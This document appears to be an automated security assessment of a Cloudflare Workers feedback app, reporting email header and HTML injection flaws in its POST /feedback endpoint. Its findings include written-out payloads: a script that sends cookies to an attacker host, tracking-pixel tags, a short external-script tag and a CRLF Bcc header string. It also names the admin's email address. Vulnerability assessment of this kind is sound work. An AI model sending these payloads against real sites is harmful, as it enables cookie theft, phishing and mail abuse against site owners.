# Injection Analysis Report (SQLi & Command Injection)

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** No SQL injection or command injection vulnerabilities were identified. The application uses Cloudflare KV (a key-value store with no query language) as its sole data store and runs on a Cloudflare Workers V8 isolate that provides no shell/process execution APIs. As a result, the classical injection categories (SQLi, CMDi) have zero attack surface in this architecture. However, two injection-adjacent vulnerabilities that are in scope for this analysis were identified: (1) **Email Header/HTML Injection** via the `POST /feedback` endpoint — `body.type` is interpolated unsanitized into the Resend API email subject line, and `body.email` is interpolated unsanitized into the HTML body of the notification email; (2) **HTML Injection in Email** via the `POST /admin/api/feedback/reply` path — previously-stored feedback user data is re-included in reply emails with only partial (incomplete) HTML escaping. All exploitable findings have been passed to the exploitation phase via `deliverables/injection_exploitation_queue.json`.
- **Purpose of this Document:** This report provides strategic context, dominant patterns, and environmental intelligence for the vulnerabilities listed in the JSON queue. It is intended to be read alongside the JSON deliverable.

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: Unsanitized Template Literal Interpolation into External API Payloads

- **Description:** User-supplied input is coerced to string and length-truncated, but receives no content sanitization (no HTML escaping, no header encoding, no character filtering) before being interpolated via JavaScript template literals into JSON bodies sent to the Resend email API. The truncation provides no injection defense — it merely limits payload size.
- **Implication:** An attacker can inject arbitrary HTML into email bodies sent to the admin (`body.email` → notification email HTML body at `worker.js:514`) and arbitrary content into the email subject line (`body.type` → subject at `worker.js:507`). The subject injection can carry CRLF sequences (URL-encoded or raw) that may allow email header injection depending on Resend's server-side handling. The HTML injection in the email body is a direct path to phishing/content spoofing in the admin's inbox, and if the admin's email client renders HTML, it may load external resources or execute scripts.
- **Representative:** INJ-VULN-01 (email subject injection), INJ-VULN-02 (email HTML body injection)

### Pattern 2: Partial HTML Escaping That Misses Injection-Relevant Characters

- **Description:** Several code locations apply `.replace(/</g,'&lt;').replace(/>/g,'&gt;')` as the sole HTML defense. This escapes only angle brackets (`<`, `>`), leaving ampersands (`&`), double quotes (`"`), single quotes (`'`), and other HTML-significant characters unescaped. In contexts where the escaped string is placed inside HTML attributes or adjacent to unescaped content, this creates residual injection risk.
- **Implication:** In the email body contexts where this partial escaping is applied (`worker.js:200, 204, 515`), the missing `&` escaping means that HTML entity references (e.g., `&#x3C;`) could survive and be interpreted by an HTML-rendering email client. More critically, in `script.js:1481` and `script.js:1493`, the same incomplete escaping is applied to admin-panel `innerHTML` rendering — a double-quote or single-quote in these strings can break out of attribute contexts in certain edge cases.
- **Representative:** INJ-VULN-03 (incomplete escaping in email HTML body for feedback text)

---

## 3. Strategic Intelligence for Exploitation

### Defensive Evasion (WAF Analysis)

- **No WAF identified.** The application runs directly on Cloudflare Workers with no custom WAF rules configured. The Cloudflare CDN/proxy layer provides basic DDoS protection but no application-layer WAF was observed to block injection payloads during reconnaissance.
- **No rate limiting** on any public endpoint, including `POST /feedback`. Attackers can send unlimited feedback submissions without being blocked.
- **Recommendation:** Payloads can be sent directly without evasion techniques. No bypass is required.

### Email API Injection Potential

- **`POST /feedback` → `entry.type` → email subject line (`worker.js:507`):** The subject is constructed as:
  ```
  `📬 Novi feedback: ${entry.type} — MarsanInvest`
  ```
  `entry.type` receives only `.slice(0, 30)`. If the Resend API does not strip CRLF from subject values before passing them to the underlying SMTP layer, a payload such as `test\r\nBcc: attacker@x.com` could inject additional email headers. The 30-character limit is tight but an attacker can test header injection within that limit.
- **`POST /feedback` → `entry.email` → HTML email body (`worker.js:514`):** The HTML body is a template literal with `${entry.email}` (200-char limit, no escaping). A payload like `<img src="https://attacker.com/track?x=1">` injects a tracking pixel. A payload like `</div><script>fetch('https://attacker.com/?c='+document.cookie)</script>` attempts to execute script in an HTML email client.
- **Confirmed Database Technology:** No SQL database. Cloudflare KV only.

### Error-Based Injection Potential

- No SQL database exists, so error-based SQLi is not applicable.
- Malformed JSON in requests returns 400 errors with `e.message` (`worker.js:531` — `detail: e.message`). This is low-value information disclosure (JavaScript parse error messages only).

---

## 4. Vectors Analyzed and Confirmed Secure

These input vectors were traced end-to-end and confirmed to use context-appropriate defenses or to have no injection-relevant sinks. They are **low-priority** for further testing.

| **Source (Parameter/Key)** | **Endpoint/File Location** | **Defense Mechanism Implemented** | **Verdict** |
|---|---|---|---|
| `body.type` (POST /feedback) | `worker.js:483` | `String().slice(0,30)` → used as KV JSON value (stored via `JSON.stringify`) | SAFE (KV storage only) |
| `body.text` (POST /feedback) | `worker.js:484` | `String().slice(0,1000)` → stored in KV; in email HTML: `.replace(/</g,'&lt;').replace(/>/g,'&gt;')` applied (`worker.js:515`) | SAFE (partial escape sufficient for angle-bracket injection in plain text node; not used in attribute context in this path) |
| `body.email` (POST /feedback) — KV storage path | `worker.js:486` | `String().slice(0,200)` → stored via `JSON.stringify` into KV — no injection surface in KV key-value context | SAFE (KV storage only) |
| `body.rating` (POST /feedback) | `worker.js:485` | `Number()` coercion → stored as JSON number; used in `'⭐'.repeat(entry.rating)` — bounded by string repeat | SAFE |
| `body.pollId` (POST /polls) | `worker.js:449` | `String().slice(0,50)` → used as JavaScript object key (no query language); stored via `JSON.stringify` | SAFE |
| `body.votes` keys/values (POST /polls) | `worker.js:461-463` | Keys: `String().slice(0,50)` as JS object keys; values: `Number()` coercion → stored via `JSON.stringify` | SAFE |
| `body.rating` (POST /rating) | `worker.js:542-543` | `parseInt()` + range check `1-5` → stored as JSON number | SAFE |
| `body.prevRating` (POST /rating) | `worker.js:548` | `parseInt() || 0` → used only as array-search target for splice (`findLastIndex`); integer only | SAFE |
| `body.messages` (POST / AI chat) | `worker.js:628` | Array `.slice(-10)` → passed as JSON array in `JSON.stringify({...messages})` to Anthropic API; no shell/SQL execution | SAFE (prompt injection is out of scope for SQLi/CMDi analysis) |
| `body.idx` (POST /admin/api/feedback/reply) | `worker.js:161` | `parseInt()` + `isNaN` check → used as array index only | SAFE |
| `body.reply` (POST /admin/api/feedback/reply) | `worker.js:162` | `String().slice(0,2000)` → stored in KV; in email HTML: `.replace(/</g,'&lt;').replace(/>/g,'&gt;')` (`worker.js:204`) | SAFE (context: HTML text node; angle-bracket escaping prevents tag injection; requires admin auth) |
| `form.username` / `form.password` (POST /admin/login) | `worker.js:292-294` | Compared via `===` to env secrets; no database, no template, no shell | SAFE |
| `body.username` / `body.password` (POST /admin/api/login) | `worker.js:315` | Same as above | SAFE |
| `body.action` (POST /admin/api/toggle) | `worker.js:357` | Ternary: `action === 'on' ? 'on' : 'off'` → strict whitelist | SAFE |
| `Authorization` header | `worker.js:150-151, 333-336` | Compared to computed hash via `===`; no injection surface | SAFE |
| `Cookie: marsanai_session` | `worker.js:275-276` | Compared to computed hash via `===`; no injection surface | SAFE |
| `items[idx].text` (stored feedback text → reply email path) | `worker.js:200` | `.replace(/</g,'&lt;').replace(/>/g,'&gt;')` — partial but adequate for text-node context; requires admin auth | SAFE (requires compromised admin + existing feedback) |

---

## 5. Detailed Vulnerable Path Records

### INJ-VULN-01: Email Header Injection — `body.type` → Email Subject

- **Source:** `body.type` — POST body JSON parameter, `POST /feedback` endpoint, `worker.js:483`
- **Combined Sources:** Single source: `body.type`
- **Path:** `POST /feedback` request body → `entry.type = String(body.type || 'prijedlog').slice(0, 30)` (worker.js:483) → template literal subject construction (worker.js:507) → `JSON.stringify({subject: ...})` → `fetch('https://api.resend.com/emails', ...)` (worker.js:498-522)
- **Sink Call:** `worker.js:507` — template literal `subject: \`📬 Novi feedback: ${entry.type} — MarsanInvest\`` inside `JSON.stringify()` body of `fetch()` to Resend email API
- **Slot Type:** Email subject field — analogous to `CMD-part-of-string` (email header value slot)
- **Sanitization Observed:** `String().slice(0, 30)` at `worker.js:483` — length truncation only; no CRLF stripping, no encoding
- **Concat Occurrences:** Template literal interpolation at `worker.js:507` — this is the only concatenation; it occurs after the only "sanitization" (truncation), which is not a content defense
- **Verdict:** Vulnerable
- **Mismatch Reason:** Length truncation is not a content defense. No CRLF stripping or header encoding is applied. A `\r\n` sequence in `body.type` (within 30 chars) is passed verbatim to the Resend API JSON body under the `subject` key. Whether the injection reaches the SMTP layer depends on Resend's implementation, but the structural flaw (unsanitized user data in email header slot) is present in the application code.
- **Witness Payload:** `type` value: `test\r\nBcc: a@b.co` (18 chars, fits 30-char limit)
- **Confidence:** Medium (confirmed structural flaw; exploitation depends on Resend API's CRLF handling before passing to SMTP)
- **Notes:** Resend is a transactional email API that internally handles SMTP. Modern email APIs often sanitize CRLF in subject fields. However, the application itself performs no such defense, making it structurally vulnerable. The 30-character truncation limits but does not eliminate the attack surface.

---

### INJ-VULN-02: HTML Injection in Email Body — `body.email` → Notification Email HTML

- **Source:** `body.email` — POST body JSON parameter, `POST /feedback` endpoint, `worker.js:486`
- **Combined Sources:** Single source: `body.email`
- **Path:** `POST /feedback` request body → `entry.email = String(body.email || '').slice(0, 200)` (worker.js:486) → template literal HTML body construction (worker.js:514) → `JSON.stringify({html: ...})` → `fetch('https://api.resend.com/emails', ...)` (worker.js:498-522)
- **Sink Call:** `worker.js:514` — template literal `<div ...>📧 ${entry.email}</div>` inside the `html:` field of the Resend API request body
- **Slot Type:** HTML body context — `TEMPLATE-expression` (user data interpolated directly into HTML string)
- **Sanitization Observed:** `String().slice(0, 200)` at `worker.js:486` — length truncation only; NO HTML escaping applied to `entry.email` at line 514 (contrast with `entry.text` at line 515 which has partial escaping)
- **Concat Occurrences:** Template literal at `worker.js:514` — only concatenation; occurs after truncation (which is not a content defense)
- **Verdict:** Vulnerable
- **Mismatch Reason:** `entry.email` is placed in an HTML element context without any HTML encoding. There is zero escaping applied — not even the partial `<`/`>` escaping used for `entry.text`. An attacker can inject arbitrary HTML tags, event handlers, or external resource references. The notification email is sent to the hardcoded admin address (`marin.marsan@gmail.com`), so the impact targets the admin user's email client.
- **Witness Payload:** `email` value: `<img src="https://attacker.example.com/track.gif">`
- **Confidence:** High (clear source-to-sink trace; no escaping whatsoever; externally triggerable without authentication)
- **Notes:** This is externally exploitable — anyone can POST to `/feedback` without authentication. The injected HTML reaches the admin's email inbox. A more sophisticated payload could include a `<script>` tag (if the email client renders JavaScript, which is rare in modern clients) or CSS-based content spoofing/phishing. The 200-character limit allows substantial HTML payloads.

---

### INJ-VULN-03: HTML Injection in Email Body — `body.type` → Notification Email HTML (Type Field)

- **Source:** `body.type` — POST body JSON parameter, `POST /feedback` endpoint, `worker.js:483`
- **Combined Sources:** Single source: `body.type`
- **Path:** `POST /feedback` request body → `entry.type = String(body.type || 'prijedlog').slice(0, 30)` (worker.js:483) → template literal HTML body construction (worker.js:513) → `JSON.stringify({html: ...})` → `fetch('https://api.resend.com/emails', ...)` (worker.js:498-522)
- **Sink Call:** `worker.js:513` — template literal `<strong style="color:#e2e5f0">${entry.type}</strong>` inside the `html:` field of the Resend API request body
- **Slot Type:** HTML body context — `TEMPLATE-expression`
- **Sanitization Observed:** `String().slice(0, 30)` at `worker.js:483` — length truncation only; no HTML escaping
- **Concat Occurrences:** Template literal at `worker.js:513`; also used in subject at `worker.js:507` (separate path — INJ-VULN-01)
- **Verdict:** Vulnerable
- **Mismatch Reason:** Same as INJ-VULN-02 — no HTML encoding. `entry.type` is placed inside `<strong>` tags in the HTML email body without escaping. An attacker can break out of the `<strong>` element and inject arbitrary HTML. The 30-character limit constrains the payload but is sufficient for compact XSS payloads (e.g., `</strong><svg/onload=fetch(//x.io)>` is 36 chars — just over limit; `</strong><script src=//x.io>` is 27 chars — fits).
- **Witness Payload:** `type` value: `</strong><script src=//x.io>` (27 chars — within 30-char limit)
- **Confidence:** High (clear source-to-sink; no escaping; externally exploitable without auth)
- **Notes:** The 30-character limit constrains but does not prevent exploitation. Short HTML injection payloads that load external scripts or images fit within the limit. Combined with the `body.email` injection (INJ-VULN-02), an attacker has two unsanitized injection points in the same email.

---

## 6. Analysis Constraints and Blind Spots

- **Resend API CRLF Handling (INJ-VULN-01):** The email header injection via `body.type` depends on how the Resend API handles CRLF characters in the `subject` JSON field before passing to SMTP. Static analysis can only confirm the structural flaw in the application code; actual header injection requires dynamic testing against Resend's API.
- **Email Client HTML Rendering:** The HTML injection vulnerabilities (INJ-VULN-02, INJ-VULN-03) depend on the admin's email client rendering HTML. Modern email clients (Gmail, Outlook) sandbox JavaScript but render HTML and load external resources. The impact assessment assumes standard HTML email rendering.
- **No SQL/Command Injection Surface:** The Cloudflare Workers V8 isolate runtime provides no `child_process`, no `exec`, no `shell`. Cloudflare KV has no query language (no SQL). These categories were fully analyzed and have zero attack surface in this architecture.
- **Prompt Injection (Out of Scope):** The `body.messages` array passed to the Anthropic API (`worker.js:648-654`) is a prompt injection vector, but this is out of scope for the SQLi/CMDi-focused injection analysis phase. The XSS specialist should handle the client-side rendering path from AI responses.
- **Stored XSS (Partially In-Scope):** The `body.email` and `body.type` fields are stored in Cloudflare KV and later rendered via `innerHTML` in the admin panel (`script.js:1479`, `script.js:1488`). This stored XSS path is a higher-severity finding but falls primarily under the XSS analysis scope. It is noted here for cross-team awareness.
